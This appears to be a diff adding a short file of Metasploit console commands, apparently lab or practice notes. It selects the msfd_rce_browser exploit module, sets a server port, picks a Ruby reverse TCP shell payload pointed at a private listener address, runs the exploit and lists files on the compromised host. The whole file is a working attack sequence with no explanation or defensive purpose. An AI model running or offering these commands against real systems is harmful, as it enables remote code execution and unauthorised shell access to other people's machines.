@@ -1,0 +1,12 @@
+msfconsole
+search tcp
+use exploit/multi/browser/msfd_rce_browser
+show -h
+set SRVPORT 1244
+show options
+show payloads
+set PAYLOAD ruby/shell_reverse_tcp
+set LHOST 192.168.90.125
+show options
+exploit
+ls -a
